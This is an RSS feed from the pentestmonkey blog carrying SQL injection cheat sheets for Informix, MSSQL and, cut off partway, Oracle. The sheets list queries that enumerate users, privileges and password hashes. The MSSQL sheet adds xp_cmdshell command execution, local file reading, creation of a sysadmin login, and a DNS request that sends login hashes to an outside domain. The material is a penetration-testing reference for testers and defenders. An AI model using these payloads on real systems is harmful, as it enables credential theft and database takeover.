<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>SQL Injection &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/category/cheat-sheet/sql-injection/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 09 Jun 2012 10:24:40 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Informix SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sat, 22 Nov 2008 19:11:36 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[informix]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=89</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into Informix databases&#8230; Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Informix Dynamic Server Express Edition 11.5 for Windows.  The Informix download page is here. This post is part of series of SQL [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into Informix databases&#8230;</p>
<p><span id="more-89"></span></p>
<p>Below are some tabulated notes on how to do many of thing you&#8217;d normally do via SQL injection.  All tests were performed on Informix Dynamic Server Express Edition 11.5 for Windows.  The Informix download page is <a href="http://www.ibm.com/developerworks/downloads/im/dsexp/?S_TACT=105AGX11&amp;S_CMP=LP">here</a>.</p>
<p>This post is part of series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT DBINFO(&#8216;version&#8217;, &#8216;full&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;server-type&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;major&#8217;), DBINFO(&#8216;version&#8217;, &#8216;minor&#8217;), DBINFO(&#8216;version&#8217;, &#8216;level&#8217;) FROM systables WHERE tabid = 1;<br />
SELECT DBINFO(&#8216;version&#8217;, &#8216;os&#8217;) FROM systables WHERE tabid = 1; &#8212; T=Windows, U=32 bit app on 32-bit Unix, H=32-bit app running on 64-bit Unix, F=64-bit app running on 64-bit unix</td>
</tr>
<tr>
<td>Comments</td>
<td>select 1 FROM systables WHERE tabid = 1; &#8212; comment</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT USER FROM systables WHERE tabid = 1;<br />
select CURRENT_ROLE FROM systables WHERE tabid = 1;</td>
</tr>
<tr>
<td>List Users</td>
<td>select username, usertype, password from sysusers;</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>TODO</td>
</tr>
<tr>
<td>List Privileges</td>
<td>select tabname, grantor, grantee, tabauth FROM systabauth join systables on systables.tabid = systabauth.tabid; &#8212; which tables are accessible by which users<br />
select procname, owner, grantor, grantee from sysprocauth join sysprocedures on sysprocauth.procid = sysprocedures.procid; &#8212; which procedures are accessible by which users</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>TODO</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DBSERVERNAME FROM systables where tabid = 1; &#8212; server name</td>
</tr>
<tr>
<td>List Databases</td>
<td>select name, owner from sysdatabases;</td>
</tr>
<tr>
<td>List Columns</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid;</td>
</tr>
<tr>
<td>List Tables</td>
<td>select tabname, owner FROM systables;<br />
select tabname, viewtext FROM sysviews  join systables on systables.tabid = sysviews.tabid;</td>
</tr>
<tr>
<td>List Stored Procedures</td>
<td>select procname, owner FROM sysprocedures;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>select tabname, colname, owner, coltype FROM syscolumns join systables on syscolumns.tabid = systables.tabid where colname like &#8216;%pass%&#8217;;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>select first 1 tabid from (select first 10 tabid from systables order by tabid) as sq order by tabid desc; &#8212; selects the 10th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT SUBSTRING(&#8216;ABCD&#8217; FROM 3 FOR 1) FROM systables where tabid = 1; &#8212; returns &#8216;C&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>select bitand(6, 1) from systables where tabid = 1; &#8212; returns 0<br />
select bitand(6, 2) from systables where tabid = 1; &#8212; returns 2</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>TODO</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>select ascii(&#8216;A&#8217;) from systables where tabid = 1;</td>
</tr>
<tr>
<td>Casting</td>
<td>select cast(&#8216;123&#8217; as integer) from systables where tabid = 1;<br />
select cast(1 as char) from systables where tabid = 1;</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;<br />
SELECT concat(&#8216;A&#8217;, &#8216;B&#8217;) FROM systables where tabid = 1; &#8212; returns &#8216;AB&#8217;</td>
</tr>
<tr>
<td>String Length</td>
<td>SELECT tabname, length(tabname), char_length(tabname), octet_length(tabname) from systables;</td>
</tr>
<tr>
<td>If Statement</td>
<td>TODO</td>
</tr>
<tr>
<td>Case Statement</td>
<td>select tabid, case when tabid&gt;10 then &#8220;High&#8221; else &#8216;Low&#8217; end from systables;</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>TODO</td>
</tr>
<tr>
<td>Time Delay</td>
<td>TODO</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>TODO</td>
</tr>
<tr>
<td>Command Execution</td>
<td>TODO</td>
</tr>
<tr>
<td>Local File Access</td>
<td>TODO</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT DBINFO(&#8216;dbhostname&#8217;) FROM systables WHERE tabid = 1; &#8212; hostname</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>TODO</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>These are the system databases:<br />
sysmaster<br />
sysadmin*<br />
sysuser*<br />
sysutils*</td>
</tr>
</tbody>
</table>
<p>* = don&#8217;t seem to contain anything / don&#8217;t allow readingInstalling Locally</p>
<p>You can download <a href="http://www.ibm.com/developerworks/downloads/im/dsexp/?S_TACT=105AGX11&amp;S_CMP=LP">Informix Dynamic Server Express Edition 11.5 Trial</a> for Linux and Windows.</p>
<p>Database ClientThere&#8217;s a <a href="http://www14.software.ibm.com/webapp/download/search.jsp?rs=ifxdl">database client SDK</a> available, but I couldn&#8217;t get the demo client working.<br />
I used <a href="http://squirrel-sql.sourceforge.net/">SQuirreL SQL Client Version 2.6.8</a> after installing the <a href="http://www14.software.ibm.com/webapp/download/search.jsp?go=y&amp;rs=ifxjdbc">Informix JDBC drivers</a> (&#8220;emerge dev-java/jdbc-informix&#8221; on Gentoo).Logging in from command line</p>
<p>If you get local admin rights on a Windows box and have a GUI logon:</p>
<ul>
<li>Click: Start | All Programs | IBM Informix Dynamic Server 11.50 | someservername.  This will give you a command prompt with various Environment variables set properly.</li>
<li>Run dbaccess.exe from your command prompt.  This will bring up a text-based GUI that allows you to browse databases.</li>
</ul>
<p>The following were set on my test system.  This may help if you get command line access, but can&#8217;t get a GUI &#8211; you&#8217;ll need to change &#8220;testservername&#8221;:</p>
<pre>set INFORMIXDIR=C:PROGRA~1IBMIBMINF~111.50
set INFORMIXSERVER=testservername
set ONCONFIG=ONCONFIG.testservername
set PATH=C:PROGRA~1IBMIBMINF~111.50bin;C:WINDOWSsystem32;C:WINDOWS;C:WINDOWSSystem32Wbem;C:PROGRA~1ibmgsk7bin;C:PROGRA~1ibmgsk7lib;C:Program FilesIBMInformixClien-SDKbin;C:Program Filesibmgsk7bin;C:Program Filesibmgsk7lib
set CLASSPATH=C:PROGRA~1IBMIBMINF~111.50extendkrakatoakrakatoa.jar;C:PROGRA~1IBMIBMINF~111.50xtendkrakatoajdbc.jar;
set DBTEMP=C:PROGRA~1IBMIBMINF~111.50infxtmp
set CLIENT_LOCALE=EN_US.CP1252
set DB_LOCALE=EN_US.8859-1
set SERVER_LOCALE=EN_US.CP1252
set DBLANG=EN_US.CP1252
mode con codepage select=1252</pre>
<pre>Identifying on the network</pre>
<p>My default installation listened on two TCP ports: 9088 and 9099.  When I created a new &#8220;server name&#8221;, this listened on 1526/TCP by default.  Nmap 4.76 didn&#8217;t identify these ports as Informix:</p>
<p>$ sudo nmap -sS -sV 10.0.0.1 -p- -v &#8211;version-all<br />
&#8230;<br />
1526/tcp open  pdap-np?<br />
9088/tcp open  unknown<br />
9089/tcp open  unknown<br />
&#8230;<br />
TODO How would we identify Informix listening on the network?</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>MSSQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:23:00 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[mssql]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=88</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into MSSQL databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into MSSQL databases&#8230;<br />
<span id="more-88"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 &#8212; comment<br />
SELECT /*comment*/1</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();<br />
SELECT system_user;<br />
SELECT user;<br />
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins &#8212; priv, mssql 2000;<br />
SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins &#8212; priv, mssql 2000.  Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.<br />
SELECT name, password_hash FROM master.sys.sql_logins &#8212; priv, mssql 2005;<br />
SELECT name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins &#8212; priv, mssql 2005</td>
</tr>
<tr>
<td> Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.  <a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>&#8212; current privs on a particular object in 2005, 2008<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;DATABASE&#8217;); &#8212; current database<br />
SELECT permission_name FROM master..fn_my_permissions(null, &#8216;SERVER&#8217;); &#8212; current server<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;master..syslogins&#8217;, &#8216;OBJECT&#8217;); &#8211;permissions on a table<br />
SELECT permission_name FROM master..fn_my_permissions(&#8216;sa&#8217;, &#8216;USER&#8217;);</p>
<p>&#8211;permissions on a user&#8211; current privs in 2005, 2008<br />
SELECT is_srvrolemember(&#8216;sysadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;dbcreator&#8217;);<br />
SELECT is_srvrolemember(&#8216;bulkadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;diskadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;processadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;serveradmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;setupadmin&#8217;);<br />
SELECT is_srvrolemember(&#8216;securityadmin&#8217;);</p>
<p>&#8212; who has a particular priv? 2005, 2008<br />
SELECT name FROM master..syslogins WHERE denylogin = 0;<br />
SELECT name FROM master..syslogins WHERE hasaccess = 1;<br />
SELECT name FROM master..syslogins WHERE isntname = 0;<br />
SELECT name FROM master..syslogins WHERE isntgroup = 0;<br />
SELECT name FROM master..syslogins WHERE sysadmin = 1;<br />
SELECT name FROM master..syslogins WHERE securityadmin = 1;<br />
SELECT name FROM master..syslogins WHERE serveradmin = 1;<br />
SELECT name FROM master..syslogins WHERE setupadmin = 1;<br />
SELECT name FROM master..syslogins WHERE processadmin = 1;<br />
SELECT name FROM master..syslogins WHERE diskadmin = 1;<br />
SELECT name FROM master..syslogins WHERE dbcreator = 1;<br />
SELECT name FROM master..syslogins WHERE bulkadmin = 1;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(&#8216;sysadmin&#8217;); &#8212; is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try &#8216;bulkadmin&#8217;, &#8216;systemadmin&#8217; and other values from the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br />
</a> SELECT is_srvrolemember(&#8216;sysadmin&#8217;, &#8216;sa&#8217;); &#8212; is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br />
SELECT name FROM master..syslogins WHERE sysadmin = &#8216;1&#8217; &#8212; tested on 2005</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;<br />
SELECT DB_NAME(N); &#8212; for N = 0, 1, 2, &#8230;</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = &#8216;mytable&#8217;); &#8212; for the current DB only<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = &#8216;U&#8217;; &#8212; use xtype = &#8216;V&#8217; for views<br />
SELECT name FROM someotherdb..sysobjects WHERE xtype = &#8216;U&#8217;;<br />
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=&#8217;sometable&#8217;; &#8212; list colum names and types for master..sometable</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>&#8212; NB: This example works only for the current database.  If you wan&#8217;t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).<br />
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = &#8216;U&#8217; AND syscolumns.name LIKE &#8216;%PASSWORD%&#8217; &#8212; this lists table, column for each column containing the word &#8216;password&#8217;</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC &#8212; gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(&#8216;abcd&#8217;, 3, 1) &#8212; returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 &#8212; returns 2<br />
SELECT 6 &amp; 1 &#8212; returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0x41) &#8212; returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(&#8216;A&#8217;) &#8211; returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(&#8216;1&#8217; as int);<br />
SELECT CAST(1 as char)</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT &#8216;A&#8217; + &#8216;B&#8217; &#8211; returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 &#8212; returns 1</span></td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END &#8212; returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) &#8212; returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td> WAITFOR DELAY &#8216;0:0:5&#8217; &#8212; pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM master..syslogins; exec(&#8216;master..xp_getfiledetails &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; nonpriv, works on 2000declare @host varchar(800); select @host = name + &#8216;-&#8216; + master.sys.fn_varbintohexstr(password_hash) + &#8216;.2.pentestmonkey.net&#8217; from sys.sql_logins; exec(&#8216;xp_fileexist &#8221;\&#8217; + @host + &#8216;c$boot.ini&#8221;&#8217;); &#8212; priv, works on 2005&#8211; NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.<br />
&#8212; Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell &#8216;net user&#8217;; &#8212; privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it&#8217;s disabled by default:<br />
EXEC sp_configure &#8216;show advanced options&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv<br />
EXEC sp_configure &#8216;xp_cmdshell&#8217;, 1; &#8212; priv<br />
RECONFIGURE; &#8212; priv</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));<br />
BULK INSERT mydata FROM &#8216;c:boot.ini&#8217;;<br />
DROP TABLE mydata;</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> &#8216;user&#8217;, &#8216;pass&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> &#8216;user&#8217;; &#8212; priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> &#8216;user&#8217;, &#8216;sysadmin; &#8212; priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; &#8211;location of master.mdf<br />
EXEC sp_helpdb pubs; &#8211;location of pubs.mdf</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind<br />
model<br />
msdb<br />
pubs &#8212; not on sql server 2005<br />
tempdb</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p><strong>From Dan Crowley:</strong><br />
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a></p>
<p><strong>From Jeremy Bae:</strong><br />
Tip about sp_helpdb &#8211; included in table above.</p>
<p><strong>From Trip:</strong><br />
List DBAs (included in table above now):</p>
<blockquote><p>select name from master..syslogins where sysadmin = &#8216;1&#8217;</p></blockquote>
<p><strong>From Daniele Costa:</strong><br />
Tips on using fn_my_permissions in 2005, 2008 &#8211; included in table above.<br />
Also:<br />
To check permissions on multiple database you will have to use the following pattern.</p>
<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)</p></blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.<br />
In this case a simple trick is to use the following syntax:</p>
<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, &#8216;DATABASE&#8217;)
</p></blockquote>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Oracle SQL Injection Cheat Sheet</title>
		<link>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet</link>
					<comments>https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Tue, 27 Nov 2007 20:20:14 +0000</pubDate>
				<category><![CDATA[SQL Injection]]></category>
		<category><![CDATA[cheatsheet]]></category>
		<category><![CDATA[database]]></category>
		<category><![CDATA[oracle]]></category>
		<category><![CDATA[pentest]]></category>
		<category><![CDATA[sqlinjection]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=87</guid>

					<description><![CDATA[Some useful syntax reminders for SQL Injection into Oracle databases&#8230; This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Some useful syntax reminders for SQL Injection into Oracle databases&#8230;<br />
<span id="more-87"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin.  These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT banner FROM v$version WHERE banner LIKE &#8216;Oracle%&#8217;;<br />
SELECT banner FROM v$version WHERE banner LIKE &#8216;TNS%&#8217;;<br />
SELECT version FROM v$instance;</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 FROM dual &#8212; comment<br />
&#8212; NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name &#8216;dual&#8217; when we&#8217;re not actually selecting from a table.</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user FROM dual</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT username FROM all_users ORDER BY username;<br />
SELECT name FROM sys.user$; &#8212; priv</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password, astatus FROM sys.user$ &#8212; priv, &lt;= 10g.  astatus tells you if acct is locked<br />
SELECT name,spare4 FROM sys.user$ &#8212; priv, 11g</td>
</tr>
<tr>
<td> Password Cracker</td>
<td><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>SELECT * FROM session_privs; &#8212; current privs<br />
SELECT * FROM dba_sys_privs WHERE grantee = &#8216;DBSNMP&#8217;; &#8212; priv, list a user&#8217;s privs<br />
SELECT grantee FROM dba_sys_privs WHERE privilege = &#8216;SELECT ANY DICTIONARY&#8217;; &#8212; priv, find users with a particular priv<br />
SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = &#8216;YES&#8217;; &#8212; priv, list DBAs, DBA roles</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT global_name FROM global_name;<br />
SELECT name FROM v$database;<br />
SELECT instance_name FROM v$instance;<br />
SELECT SYS.DATABASE_NAME FROM DUAL;</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT DISTINCT owner FROM all_tables; &#8212; list schemas (one per user)<br />
&#8212; Also query TNS listener for other databases.  See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217;;<br />
SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217; and owner = &#8216;foo&#8217;;</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT table_name FROM all_tables;<br />
SELECT owner, table_name FROM all_tables;</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE &#8216;%PASS%&#8217;; &#8212; NB: table names are upper case</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; &#8212; gets 9th row (rows numbered from 1)</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substr(&#8216;abcd&#8217;, 3, 1) FROM dual; &#8212; gets 3rd character, &#8216;c&#8217;</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT bitand(6,2) FROM dual; &#8212; returns 2<br />
SELECT bitand(6,1) FROM dual; &#8212; returns0</td>
</tr>
<tr>
